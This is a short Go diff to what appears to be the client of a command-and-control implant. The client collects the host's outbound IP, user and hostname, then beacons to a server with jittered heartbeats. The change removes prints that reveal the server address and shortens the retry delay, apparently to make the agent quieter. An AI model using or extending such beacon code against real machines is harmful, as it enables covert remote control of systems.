@@ -280,9 +280,6 @@ func randSleep(min, max int) time.Duration {
 }
 
 func main() {
-	fmt.Println("This is server IP = ", SERVERIP)
-	fmt.Println("This is server PORT = ", PORT)
-
 	ip := GetOutboundIP()
 	user, _ := user.Current()
 	osName, _ := os.Hostname()
@@ -331,7 +328,8 @@ func main() {
 				if heartbeatResult == 2 {
 					break
 				}
-				time.Sleep(randSleep(30, 40) * time.Second)
+				// Retry heartbeat with shorter interval
+				time.Sleep(randSleep(10, 20) * time.Second)
 			}
 
 			registerkey = firstContact()
